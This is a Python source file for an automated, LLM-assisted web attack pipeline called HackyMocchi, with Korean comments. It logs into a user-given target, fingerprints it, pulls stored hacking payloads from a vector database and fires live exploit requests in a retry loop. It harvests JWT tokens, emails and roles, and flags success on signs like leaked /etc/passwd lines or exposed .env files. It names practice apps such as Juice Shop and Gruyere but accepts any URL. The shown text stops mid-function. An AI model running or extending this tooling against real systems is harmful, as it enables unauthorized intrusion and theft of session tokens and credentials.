import os
import asyncio
import json
import socket
import re
import requests
import urllib3
from typing import AsyncGenerator, List, Optional, Annotated
from urllib.parse import urlparse

from fastapi import FastAPI
from fastapi.responses import FileResponse, StreamingResponse, Response
from pydantic import BaseModel

# ── LangChain / LangGraph Imports ─────────────────────────────────
from langchain_chroma import Chroma
from langchain_huggingface import HuggingFaceEmbeddings
from langchain_core.documents import Document
from langchain_core.retrievers import BaseRetriever          # ★ Retriever 인터페이스
from langchain_core.callbacks import CallbackManagerForRetrieverRun
from langchain_groq import ChatGroq                          # ★ LangChain LLM 래퍼
from langchain_core.prompts import ChatPromptTemplate
from langchain_core.output_parsers import StrOutputParser

from langgraph.graph import StateGraph, END                  # ★ LangGraph
from langgraph.graph.message import add_messages
from typing_extensions import TypedDict

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = FastAPI(title="HackyMocchi API - LangGraph Edition")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "hackymocchi", "chroma_data")
COLLECTION_KNOWLEDGE = "vuln_knowledge"
COLLECTION_PAYLOADS = "hacking_payloads"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 1. LangGraph State 정의
#    → 기존 코드의 state = { ... } 딕셔너리를 TypedDict로 교체
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class PipelineState(TypedDict):
    # 입력
    target_url: str
    username: Optional[str]
    password: Optional[str]
    _session_cookie: str
    _custom_headers: dict

    # Recon 결과
    target_ip: str
    server: str
    detected_tech: str

    # Retrieve 결과
    context: str
    _doc_count: int

    # Generate / Exploit 루프
    final_payload: str
    http_method: str
    post_data: dict
    _explanation: str
    _content_type: str
    is_success: bool
    attempts: int
    last_feedback: str
    _status_code: Optional[int]
    _indicators_found: list
    _jwt_token: Optional[str]
    _captured_email: Optional[str]
    _captured_role: Optional[str]
    _response_preview: str
    _attack_url: str
    _attack_method: str
    _attack_data: dict
    _gruyere_uid: Optional[str]

    # SSE emit 콜백 (직렬화 불가 → 런타임 주입)
    _emit_fn: Optional[object]


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 2. Custom LangChain Retriever
#    → 기존 similarity_search() 직접 호출을 Retriever 인터페이스로 래핑
#    → 멀티 쿼리 + 두 컬렉션(vuln / payloads) 통합 검색
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class SecurityRetriever(BaseRetriever):
    """
    LangChain BaseRetriever를 상속한 커스텀 보안 검색기.

    기존 코드:
        for doc in self.vs_vuln.similarity_search(q, k=1): ...
        for doc in self.vs_payloads.similarity_search(q, k=1): ...

    변경 후:
        retriever = SecurityRetriever(vs_vuln=..., vs_payloads=...)
        docs = retriever.invoke(query)   ← LangChain 표준 인터페이스
    """
    vs_vuln: Chroma
    vs_payloads: Chroma
    llm: ChatGroq
    k: int = 1

    class Config:
        arbitrary_types_allowed = True

    def _get_relevant_documents(
        self,
        query: str,
        *,
        run_manager: CallbackManagerForRetrieverRun,
    ) -> List[Document]:
        # ── Step 1: LLM으로 쿼리 최적화 (기존 _optimize_query) ──────
        tech = query.split("||")[1] if "||" in query else ""
        base_query = query.split("||")[0]

        optimize_prompt = ChatPromptTemplate.from_template(
            "You are a security expert. Convert this to a precise CVE/Exploit DB search query.\n"
            "Tech Stack: {tech}\n"
            "Attack Goal: {query}\n"
            "Output ONLY English search keywords (max 6 words).\n"
            "Example: 'Node.js Express SQLi auth bypass payload'"
        )
        chain = optimize_prompt | self.llm | StrOutputParser()
        try:
            optimized = chain.invoke({"tech": tech, "query": base_query})
        except Exception:
            optimized = f"{tech} {base_query} exploit payload"

        # ── Step 2: 멀티 쿼리 벡터 검색 ──────────────────────────────
        knowledge_queries = [
            f"SQL injection {tech} web application vulnerability",
            f"web authentication bypass {tech}",
            f"XSS cross-site scripting {tech}",
        ]
        payload_queries = [
            optimized,
            "SQL injection authentication bypass login payload",
            f"web exploit {tech} HTTP request payload",
            "XSS payload input injection",
            "LFI path traversal web exploit",
        ]

        seen: set = set()
        results: List[Document] = []

        for q in knowledge_queries:
            for doc in self.vs_vuln.similarity_search(q, k=self.k):
                if doc.page_content not in seen:
                    seen.add(doc.page_content)
                    doc.metadata["source_collection"] = "vuln_knowledge"
                    results.append(doc)

        for q in payload_queries:
            for doc in self.vs_payloads.similarity_search(q, k=self.k):
                if doc.page_content not in seen:
                    seen.add(doc.page_content)
                    doc.metadata["source_collection"] = "hacking_payloads"
                    results.append(doc)

        return results


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 3. 전역 컴포넌트 초기화
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
retriever: Optional[SecurityRetriever] = None
llm: Optional[ChatGroq] = None


def init_components(db_path: str):
    global retriever, llm

    print("\n[*] Initializing LangGraph Security Engine...")

    print("    1. Loading Embeddings...")
    embeddings = HuggingFaceEmbeddings(
        model_name="sentence-transformers/all-MiniLM-L6-v2"
    )

    print("    2. Connecting to Vector DB...")
    vs_payloads = Chroma(
        collection_name=COLLECTION_PAYLOADS,
        persist_directory=db_path,
        embedding_function=embeddings,
    )
    vs_vuln = Chroma(
        collection_name=COLLECTION_KNOWLEDGE,
        persist_directory=db_path,
        embedding_function=embeddings,
    )

    print("    3. Initializing ChatGroq LLM...")  # ★ 기존 Groq SDK → LangChain ChatGroq
    llm = ChatGroq(
        api_key=os.environ.get("GROQ_API_KEY"),
        model="llama-3.1-8b-instant",
        temperature=0.6,
    )

    print("    4. Building SecurityRetriever...")  # ★ 핵심: Retriever 생성
    retriever = SecurityRetriever(
        vs_vuln=vs_vuln,
        vs_payloads=vs_payloads,
        llm=llm,
    )

    print("[+] Engine Ready! (LangGraph + LangChain Retriever)\n")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 4. LangGraph 노드 함수들
#    → 기존 _recon(), _exploit() 등을 노드(node)로 변환
#    → 각 노드는 PipelineState를 받아 업데이트된 dict 반환
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def node_login(state: PipelineState) -> dict:
    """노드 0 (선택): 자동 로그인"""
    emit = state.get("_emit_fn")
    if emit:
        emit("step_update", {"index": 0, "status": "running"})

    result = _auto_login(state["target_url"], state["username"], state["password"])

    if emit:
        emit("stage", {"stage": "login_result", "data": result})
        emit("step_update", {"index": 0, "status": "complete"})

    return {
        "_session_cookie": result.get("cookie", ""),
    }


def node_recon(state: PipelineState) -> dict:
    """노드 1: Recon — 대상 IP, 서버, 기술 스택 탐지"""
    off = 1 if (state.get("username") and state.get("password")) else 0
    emit = state.get("_emit_fn")
    if emit:
        emit("step_update", {"index": off + 0, "status": "running"})

    result = _recon(state)

    if emit:
        emit("stage", {"stage": "recon_result", "data": {
            "ip": result["target_ip"],
            "server": result["server"],
            "tech": result["detected_tech"],
        }})
        emit("step_update", {"index": off + 0, "status": "complete"})

    return result


def node_retrieve(state: PipelineState) -> dict:
    """
    노드 2: Retrieve — LangChain Retriever로 관련 문서 검색

    기존 코드:
        context_text = search_engine.search(user_query, tech, top_n=5)

    변경 후:
        docs = retriever.invoke(f"{user_query}||{tech}")
        context = docs를 구조화된 텍스트로 변환
    """
    off = 1 if (state.get("username") and state.get("password")) else 0
    emit = state.get("_emit_fn")
    if emit:
        emit("step_update", {"index": off + 1, "status": "running"})

    context_text = ""
    doc_count = 0

    if retriever:
        try:
            # ★ LangChain Retriever 표준 호출
            query_with_tech = f"authentication bypass RCE injection payloads||{state['detected_tech']}"
            docs: List[Document] = retriever.invoke(query_with_tech)

            # 컬렉션별로 분리해서 구조화된 context 생성
            pay_docs = [d for d in docs if d.metadata.get("source_collection") == "hacking_payloads"]
            vuln_docs = [d for d in docs if d.metadata.get("source_collection") == "vuln_knowledge"]

            context_lines = []
            if pay_docs:
                context_lines.append("[Payload Examples from DB]")
                for doc in pay_docs[:4]:
                    context_lines.append(f"- {doc.page_content.strip()[:200]}")
            if vuln_docs:
                context_lines.append("[Vulnerability Knowledge]")
                for doc in vuln_docs[:2]:
                    context_lines.append(f"- {doc.page_content.strip()[:200]}")

            context_text = "\n".join(context_lines)
            doc_count = len(docs)

        except Exception as e:
            context_text = _web_fallback_context(state["detected_tech"])
    else:
        context_text = _web_fallback_context(state["detected_tech"])

    if emit:
        emit("stage", {"stage": "retrieve_result", "data": {
            "doc_count": doc_count,
            "context_length": len(context_text),
        }})
        emit("step_update", {"index": off + 1, "status": "complete"})

    return {"context": context_text, "_doc_count": doc_count}


def node_generate(state: PipelineState) -> dict:
    """노드 3: Generate — Rule-Based 페이로드 생성"""
    off = 1 if (state.get("username") and state.get("password")) else 0
    emit = state.get("_emit_fn")
    attempt_num = state.get("attempts", 0) + 1

    if emit:
        emit("step_update", {"index": off + 2, "status": "running"})

    rb = _rule_based_payload(state, attempt_num)
    updates = {
        "final_payload": rb["url"],
        "http_method": rb["method"],
        "post_data": rb["data"],
        "_explanation": rb["explanation"],
        "_content_type": rb.get("content_type", "json"),
    }

    if emit:
        emit("stage", {"stage": "generate_result", "data": {
            "url": rb["url"],
            "method": rb["method"],
            "post_data": rb["data"],
            "explanation": rb["explanation"],
            "attempt": attempt_num,
        }})
        emit("step_update", {"index": off + 2, "status": "complete"})

    return updates


def node_exploit(state: PipelineState) -> dict:
    """노드 4: Exploit — 실제 HTTP 공격 실행 및 성공 판정"""
    off = 1 if (state.get("username") and state.get("password")) else 0
    emit = state.get("_emit_fn")

    if emit:
        emit("step_update", {"index": off + 3, "status": "running"})

    result = _exploit(state)

    if emit:
        emit("stage", {"stage": "exploit_result", "data": {
            "is_success": result["is_success"],
            "attempt": result["attempts"],
            "feedback": result["last_feedback"],
            "status_code": result.get("_status_code"),
            "indicators_found": result.get("_indicators_found", []),
            "jwt_token": result.get("_jwt_token"),
            "captured_email": result.get("_captured_email"),
            "captured_role": result.get("_captured_role"),
            "attack_url": result.get("_attack_url", ""),
            "attack_method": result.get("_attack_method", ""),
            "attack_data": result.get("_attack_data", {}),
            "response_preview": result.get("_response_preview", ""),
            "target_url": state["target_url"],
        }})
        emit("step_update", {"index": off + 3, "status": "complete"})

    return result


def node_report(state: PipelineState) -> dict:
    """노드 5: Report — 최종 보고서 생성"""
    off = 1 if (state.get("username") and state.get("password")) else 0
    emit = state.get("_emit_fn")

    if emit:
        emit("step_update", {"index": off + 4, "status": "running"})

    report_text = _build_report(state)

    if emit:
        emit("stage", {"stage": "report_result", "data": {"report": report_text}})
        emit("step_update", {"index": off + 4, "status": "complete"})

    return {}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 5. LangGraph 조건부 엣지 (Conditional Edge)
#    → 기존 while not state["is_success"] and state["attempts"] < MAX_ATTEMPTS
#    → LangGraph의 should_continue 패턴으로 교체
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
MAX_ATTEMPTS = 12

def should_continue(state: PipelineState) -> str:
    """
    exploit 노드 실행 후 다음 경로 결정.

    기존 코드:
        if state["is_success"]:
            break
        → while 루프 반복

    변경 후:
        "continue" → generate 노드로 돌아가서 재시도
        "end"      → report 노드로 이동
    """
    if state.get("is_success", False):
        return "end"
    if state.get("attempts", 0) >= MAX_ATTEMPTS:
        return "end"
    return "continue"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 6. LangGraph 그래프 빌드
#    → 노드와 엣지를 연결해서 StateGraph 완성
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def build_graph(has_login: bool) -> StateGraph:
    """
    기존 run_pipeline()의 순차 흐름을 LangGraph StateGraph로 재설계.

    그래프 구조:
        [login] → recon → retrieve → generate → exploit
                                         ↑           |
                                         └─continue──┘
                                                     |
                                                    end
                                                     ↓
                                                  report → END
    """
    graph = StateGraph(PipelineState)

    # 노드 등록
    if has_login:
        graph.add_node("login", node_login)
    graph.add_node("recon", node_recon)
    graph.add_node("retrieve", node_retrieve)
    graph.add_node("generate", node_generate)
    graph.add_node("exploit", node_exploit)
    graph.add_node("report", node_report)

    # 엣지 연결 (순차)
    if has_login:
        graph.set_entry_point("login")
        graph.add_edge("login", "recon")
    else:
        graph.set_entry_point("recon")

    graph.add_edge("recon", "retrieve")
    graph.add_edge("retrieve", "generate")
    graph.add_edge("generate", "exploit")

    # 조건부 엣지: exploit → (continue: generate | end: report)
    graph.add_conditional_edges(
        "exploit",
        should_continue,
        {
            "continue": "generate",   # 재시도
            "end": "report",          # 종료
        },
    )
    graph.add_edge("report", END)

    return graph.compile()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 7. FastAPI 엔드포인트 (SSE 스트리밍)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class AnalyzeRequest(BaseModel):
    target_url: str
    session_cookie: Optional[str] = None
    custom_headers: Optional[dict] = None
    username: Optional[str] = None
    password: Optional[str] = None


@app.on_event("startup")
async def startup_event():
    if os.path.exists(DB_PATH):
        init_components(DB_PATH)
    else:
        print(f"[!] DB Path not found: {DB_PATH}")


@app.get("/")
async def index():
    return FileResponse(os.path.join(BASE_DIR, "index.html"))


@app.post("/api/analyze")
async def analyze(req: AnalyzeRequest):
    return StreamingResponse(
        run_pipeline(
            req.target_url, req.session_cookie,
            req.custom_headers, req.username, req.password
        ),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


@app.post("/api/report/pdf")
async def export_pdf(state: dict):
    try:
        from pdf_report import build_pdf, _detect_attack_type as _pdf_detect
        atype = _pdf_detect(state) if state.get("is_success") else "none"
        pdf_bytes = await asyncio.to_thread(build_pdf, state, atype)
        return Response(
            content=pdf_bytes,
            media_type="application/pdf",
            headers={"Content-Disposition": "attachment; filename=pentest_report.pdf"},
        )
    except Exception as e:
        return Response(content=f"PDF 생성 오류: {e}", status_code=500)


def emit(event_type: str, data: dict) -> str:
    return f"event: {event_type}\ndata: {json.dumps(data, ensure_ascii=False)}\n\n"


async def run_pipeline(
    target_url: str,
    session_cookie: str = None,
    custom_headers: dict = None,
    username: str = None,
    password: str = None,
) -> AsyncGenerator[str, None]:

    has_login = bool(username and password)
    steps = (["login"] if has_login else []) + ["recon", "retrieve", "generate", "exploit", "report"]

    # SSE 큐: 노드 내부에서 emit한 이벤트를 여기로 수집
    sse_queue: asyncio.Queue = asyncio.Queue()

    def _emit(event_type: str, data: dict):
        """노드 내부에서 호출 → SSE 큐에 적재"""
        sse_queue.put_nowait(emit(event_type, data))

    yield emit("pipeline_init", {"steps": steps})

    # 초기 State 구성
    initial_state: PipelineState = {
        "target_url": target_url,
        "username": username,
        "password": password,
        "_session_cookie": session_cookie or "",
        "_custom_headers": custom_headers or {},
        "target_ip": "Unknown",
        "server": "Unknown",
        "detected_tech": "Web Vulnerability",
        "context": "",
        "_doc_count": 0,
        "final_payload": target_url,
        "http_method": "GET",
        "post_data": {},
        "_explanation": "",
        "_content_type": "json",
        "is_success": False,
        "attempts": 0,
        "last_feedback": "None",
        "_status_code": None,
        "_indicators_found": [],
        "_jwt_token": None,
        "_captured_email": None,
        "_captured_role": None,
        "_response_preview": "",
        "_attack_url": "",
        "_attack_method": "",
        "_attack_data": {},
        "_gruyere_uid": "",
        "_emit_fn": _emit,   # SSE 콜백 주입
    }

    # LangGraph 그래프 빌드 및 실행 (별도 스레드에서)
    graph = build_graph(has_login)

    async def _run_graph():
        # 👇 여기는 스페이스바 8칸 (기준선에서 4칸 더 들어감)
        result = await asyncio.to_thread(graph.invoke, initial_state)
        sse_queue.put_nowait(None)  # 종료 신호
        return result

    # 👇 다시 기준선(스페이스바 4칸)
    graph_task = asyncio.create_task(_run_graph())

    # SSE 큐에서 이벤트를 꺼내서 스트리밍
    while True:
        msg = await sse_queue.get()
        if msg is None:
            break
        yield msg

    # 2. graph_task가 반환한 최종 상태를 변수에 저장 (get_state 대체)
    final_state = await graph_task

    # 3. final 대신 final_state를 사용하여 done 이벤트 전송
    yield emit("done", {
        "is_success": final_state.get("is_success", False),
        "attempts": final_state.get("attempts", 0),
        "target_url": target_url,
        "target_ip": final_state.get("target_ip", "Unknown"),
        "detected_tech": final_state.get("detected_tech", "Unknown"),
    })


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 8. 기존 Helper 함수들 (변경 없음 — 노드에서 그대로 호출)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _auto_login(target_url: str, username: str, password: str) -> dict:
    parsed = urlparse(target_url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })

    def _extract_hidden_fields(html):
        fields = {}
        for m in re.finditer(
            r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([^"\']+)["\'][^>]+value=["\']([^"\']*)["\']',
            html, re.IGNORECASE
        ):
            fields[m.group(1)] = m.group(2)
        for m in re.finditer(
            r'<input[^>]+name=["\']([^"\']+)["\'][^>]+type=["\']hidden["\'][^>]+value=["\']([^"\']*)["\']',
            html, re.IGNORECASE
        ):
            if m.group(1) not in fields:
                fields[m.group(1)] = m.group(2)
        return fields

    def _cookie_string(s):
        return "; ".join(f"{k}={v}" for k, v in s.cookies.items())

    if "hackthissite" in base.lower():
        try:
            login_url = f"{base}/user/login"
            page = session.get(login_url, timeout=10, verify=False)
            hidden = _extract_hidden_fields(page.text)
            post_data = {"username": username, "password": password, "btn_submit": "Login", **hidden}
            resp = session.post(login_url, data=post_data,
                                headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": login_url},
                                timeout=10, verify=False, allow_redirects=True)
            cookie_str = _cookie_string(session)
            success = (username.lower() in resp.text.lower() or "logout" in resp.text.lower() or bool(cookie_str))
            if any(msg in resp.text.lower() for msg in ["incorrect password", "invalid username"]):
                success = False
            return {"success": success, "cookie": cookie_str if success else "",
                    "message": f"로그인 {'성공 ✅' if success else '실패 ❌'}"}
        except Exception as e:
            return {"success": False, "cookie": "", "message": str(e)[:120]}

    # ── WordPress ───────────────────────────────────────────────────
    if "wp-login" in base.lower() or "wordpress" in base.lower():
        try:
            login_url = f"{base}/wp-login.php"
            page = session.get(login_url, timeout=10, verify=False)
            hidden = _extract_hidden_fields(page.text)
            post_data = {
                "log": username, "pwd": password,
                "wp-submit": "Log In", "redirect_to": f"{base}/wp-admin/",
                "testcookie": "1", **hidden,
            }
            session.cookies.set("wordpress_test_cookie", "WP+Cookie+check")
            resp = session.post(
                login_url, data=post_data,
                headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": login_url},
                timeout=10, verify=False, allow_redirects=True,
            )
            cookie_str = _cookie_string(session)
            success = "wp-admin" in resp.url or any("wordpress_logged_in" in k for k in session.cookies.keys())
            if success:
                return {"success": True, "cookie": cookie_str,
                        "message": f"WordPress 로그인 성공 ({cookie_str[:80]})"}
            else:
                return {"success": False, "cookie": "", "message": "WordPress 로그인 실패 — 아이디/비밀번호를 확인하세요"}
        except Exception as e:
            return {"success": False, "cookie": "", "message": f"로그인 오류: {str(e)[:120]}"}

    # ── Generic Form Login ──────────────────────────────────────────
    for login_path in ["/login", "/user/login", "/auth/login", "/signin", "/account/login"]:
        try:
            login_url = f"{base}{login_path}"
            page = session.get(login_url, timeout=8, verify=False)
            if page.status_code != 200:
                continue
            hidden = _extract_hidden_fields(page.text)
            post_data = {"username": username, "password": password, "email": username, **hidden}
            resp = session.post(
                login_url, data=post_data,
                headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": login_url},
                timeout=10, verify=False, allow_redirects=True,
            )
            cookie_str = _cookie_string(session)
            if resp.status_code == 200 and ("logout" in resp.text.lower()) and bool(cookie_str):
                return {"success": True, "cookie": cookie_str,
                        "message": f"로그인 성공 ({login_path}) 쿠키: {cookie_str[:80]}"}
        except Exception:
            continue

    return {"success": False, "cookie": "", "message": "자동 로그인 지원 안됨 — 수동으로 쿠키를 입력하세요"}


def _extract_gruyere_uid(url_or_path: str) -> str:
    """
    Gruyere UID는 URL 첫 경로 세그먼트의 긴 숫자 값이다.
    예: https://google-gruyere.appspot.com/4038.../feed.gtl
    """
    try:
        path = urlparse(url_or_path).path if "://" in (url_or_path or "") else (url_or_path or "")
        parts = [p for p in path.split("/") if p]
        if not parts:
            return ""
        first = parts[0]
        if first.isdigit() and len(first) >= 10:
            return first
    except Exception:
        pass
    return ""


def _discover_gruyere_uid(target_url: str, final_url: str, response_text: str, location_header: str = "") -> str:
    # 1) target/final/location URL 경로에서 직접 추출
    for candidate in (target_url, final_url, location_header):
        uid = _extract_gruyere_uid(candidate)
        if uid:
            return uid

    # 2) HTML 내 링크에서 추출
    host = urlparse(target_url).netloc or "google-gruyere.appspot.com"
    patterns = [
        rf"https?://{re.escape(host)}/(\d{{10,}})(?:/|[\"'])",
        r'href=["\']/(\d{10,})(?:/|["\'])',
        r'src=["\']/(\d{10,})(?:/|["\'])',
    ]
    for pat in patterns:
        m = re.search(pat, response_text or "", re.IGNORECASE)
        if m:
            return m.group(1)

    return ""


def _recon(state: dict) -> dict:
    url = state["target_url"]
    user_cookie = state.get("_session_cookie", "")
    user_headers = dict(state.get("_custom_headers", {}))
    try:
        domain = urlparse(url).netloc.split(":")[0]
        ip = socket.gethostbyname(domain)
        req_headers = {}
        if user_cookie:
            req_headers["Cookie"] = user_cookie
        req_headers.update(user_headers)
        res = requests.get(url, timeout=5, verify=False, headers=req_headers or None)
        server = res.headers.get("Server", "Unknown")
        x_powered = res.headers.get("X-Powered-By", "")
        body_snippet = res.text[:2000].lower()
        final_url = str(res.url)  # final URL after redirects

        # ── Gruyere UID extraction (auto-discovery) ──────────────────────
        gruyere_uid = ""
        if "gruyere" in url.lower() or "gruyere" in final_url.lower():
            gruyere_uid = _discover_gruyere_uid(
                target_url=url,
                final_url=final_url,
                response_text=res.text,
                location_header=res.headers.get("Location", ""),
            )

            # 루트 URL 입력 시 첫 응답에서 UID가 없을 수 있어 한번 더 보강 조회
            if not gruyere_uid:
                try:
                    parsed = urlparse(url)
                    gruyere_root = f"{parsed.scheme}://{parsed.netloc}/"
                    root_res = requests.get(gruyere_root, timeout=5, verify=False, headers=req_headers or None)
                    gruyere_uid = _discover_gruyere_uid(
                        target_url=url,
                        final_url=str(root_res.url),
                        response_text=root_res.text,
                        location_header=root_res.headers.get("Location", ""),
                    )
                except Exception:
                    pass

            # /start는 UID로 리다이렉트되는 Gruyere 진입점이라 마지막 폴백으로 사용
            if not gruyere_uid:
                try:
                    parsed = urlparse(url)
                    start_url = f"{parsed.scheme}://{parsed.netloc}/start"
                    start_res = requests.get(start_url, timeout=5, verify=False, headers=req_headers or None)
                    gruyere_uid = _discover_gruyere_uid(
                        target_url=url,
                        final_url=str(start_res.url),
                        response_text=start_res.text,
                        location_header=start_res.headers.get("Location", ""),
                    )
                except Exception:
                    pass

        # ── URL-based detection (highest priority) ────────────────────────
        tech = "General Web App"
        if "WebGoat" in url or "webgoat" in url.lower():
            tech = "Java/Spring Boot (WebGoat)"
        elif "gruyere" in url.lower() or "gruyere" in final_url.lower():
            tech = "Python (Google Gruyere)"
        # ── Server header detection ───────────────────────────────────────
        elif "Apache" in server: tech = "Apache"
        elif "Nginx" in server: tech = "Nginx"
        elif "Express" in server or "Express" in x_powered: tech = "Node.js/Express"
        elif "IIS" in server: tech = "IIS"
        elif "Python" in server or "Werkzeug" in server: tech = "Python Web App"
        elif "HackThisSite" in server or "hackthissite" in server.lower(): tech = "HackThisSite (PHP/Custom)"
        elif "Heroku" in server or "heroku" in server.lower():
            tech = "Node.js/Express (Juice Shop)" if ("juice" in body_snippet or "owasp" in body_snippet) else "Node.js/Express"
        # ── Body content fallback ─────────────────────────────────────────
        if tech == "General Web App":
            if "juice shop" in body_snippet or "owasp" in body_snippet: tech = "Node.js/Express (Juice Shop)"
            elif "wordpress" in body_snippet or "wp-content" in body_snippet: tech = "WordPress"
            elif "hackthissite" in body_snippet: tech = "HackThisSite (PHP/Custom)"
            elif "webgoat" in body_snippet: tech = "Java/Spring Boot (WebGoat)"
            elif "gruyere" in body_snippet: tech = "Python (Google Gruyere)"
        return {"target_ip": ip, "detected_tech": tech, "server": server, "attempts": 0,
                "_gruyere_uid": gruyere_uid}
    except Exception as e:
        return {"target_ip": "Unknown", "detected_tech": "Web Vulnerability",
                "server": f"Error: {str(e)[:60]}", "attempts": 0}


def _exploit(state: dict) -> dict:
    payload = state["final_payload"]
    method = state.get("http_method", "GET")
    post_data = state.get("post_data", {})
    req_content_type = state.get("_content_type", "json")

    is_login_endpoint = method == "POST" and any(
        kw in payload.lower() for kw in ["/login", "/signin", "/auth", "/user/login"]
    )

    # NOTE: `uid=`는 Gruyere 정상 페이지/링크에도 자주 포함되어 오탐을 유발하므로 제외.
    generic_indicators = [
        "root:x:0:0:", "SQL syntax", "You have an error in your SQL",
        "acquisitions", "PackageType",
    ]
    # login 응답에서만 의미가 있는 지표들(일반 페이지 오탐 방지)
    login_indicators = ["admin@juice-sh.op", "authentication", "token"]
    webgoat_indicators = [
        "Congratulations", "WEBGOAT_ADMIN", "assignment_solved",
        "You have successfully completed", '"success":true', '"success": true',
        "lessonCompleted",
    ]
    # Gruyere 전용 시그니처(일반 홈 화면 텍스트는 제외)
    gruyere_indicators = [
        "_feed(", "_snippet(", "gruyere.onread(", "while(1);", ")]}',",
    ]
    ctf_indicators = [
        'type="hidden" name="pass"', "type='hidden' name='pass'",
        'name="pass" type="hidden"', "name='pass' type='hidden'",
        'type="hidden" name="solution"', 'name="solution" type="hidden"',
        "var pass =", "var password =", "var solution =",
        "if (pass ==", "if (password ==",
        "The password to this level",
        "Index of /", "Directory listing",
        "root:x:0:0:",
        "Congratulations", "You have passed",
    ]
    robots_sensitive = ["/admin", "/private", "/backup", "/secret", "/config", "/db", "/database"]

    def _is_real_file_exposed(response_text: str, file_type: str, sc: int) -> bool:
        if sc != 200:
            return False
        text_lower = response_text.lower()
        is_html = text_lower.strip().startswith("<!doctype") or text_lower.strip().startswith("<html")
        if is_html:
            return False
        if file_type == "htpasswd":
            return bool(re.search(r'\w+:\$apr1\$|\w+:\{SHA\}|\w+:\$2[aby]\$', response_text))
        if file_type == "env":
            return len(re.findall(r'^[A-Z_]+=.+', response_text, re.MULTILINE)) >= 2
        if file_type == "bak":
            return "<?php" in response_text or "<?=" in response_text
        return not is_html

    form_login_success = ["dashboard", "welcome", "logout", "profile", "my account"]

    user_cookie = state.get("_session_cookie", "")
    user_headers = dict(state.get("_custom_headers", {}))

    try:
        session = requests.Session()
        if user_cookie:
            session.headers.update({"Cookie": user_cookie})
        if user_headers:
            session.headers.update(user_headers)

        # ── CSRF 토큰 추출 (form 기반 POST 전에 실행) ──────────────────
        csrf_token = None
        if method == "POST" and req_content_type == "form":
            try:
                login_page = session.get(payload, timeout=5, verify=False)
                for pattern in [
                    r'name=["\']csrfmiddlewaretoken["\'][^>]+value=["\']([^"\']+)["\']',
                    r'value=["\']([^"\']+)["\'][^>]+name=["\']csrfmiddlewaretoken["\']',
                    r'name=["\']_token["\'][^>]+value=["\']([^"\']+)["\']',
                    r'name=["\']csrf_token["\'][^>]+value=["\']([^"\']+)["\']',
                    r'name=["\']csrf["\'][^>]+value=["\']([^"\']+)["\']',
                    r'<input[^>]+name=["\']form_token["\'][^>]+value=["\']([^"\']+)["\']',
                ]:
                    csrf_match = re.search(pattern, login_page.text, re.IGNORECASE)
                    if csrf_match:
                        csrf_token = csrf_match.group(1)
                        break
                if csrf_token:
                    post_data = dict(post_data)
                    post_data["form_token"] = csrf_token
            except Exception:
                pass

        if method == "POST":
            if req_content_type == "form":
                res = session.post(
                    payload, data=post_data,
                    headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": payload},
                    timeout=8, verify=False, allow_redirects=True,
                )
            else:
                res = session.post(
                    payload, json=post_data,
                    headers={"Content-Type": "application/json"},
                    timeout=8, verify=False,
                )
        else:
            res = session.get(payload, timeout=8, verify=False)

        status_code = res.status_code
        is_json = "application/json" in res.headers.get("Content-Type", "")
        response_preview = res.text[:400]

        # ── JWT 토큰 추출 ────────────────────────────────────────────────
        jwt_token = None
        captured_email = None
        captured_role = None

        try:
            resp_json = res.json()
            auth = resp_json.get("authentication", {})
            jwt_token = auth.get("token") or resp_json.get("token")
            captured_email = auth.get("umail") or resp_json.get("email")
            if isinstance(resp_json.get("data"), dict):
                data_obj = resp_json["data"]
                jwt_token = jwt_token or data_obj.get("token")
                captured_email = captured_email or data_obj.get("email")
                captured_role = data_obj.get("role")
        except Exception:
            pass

        if not jwt_token:
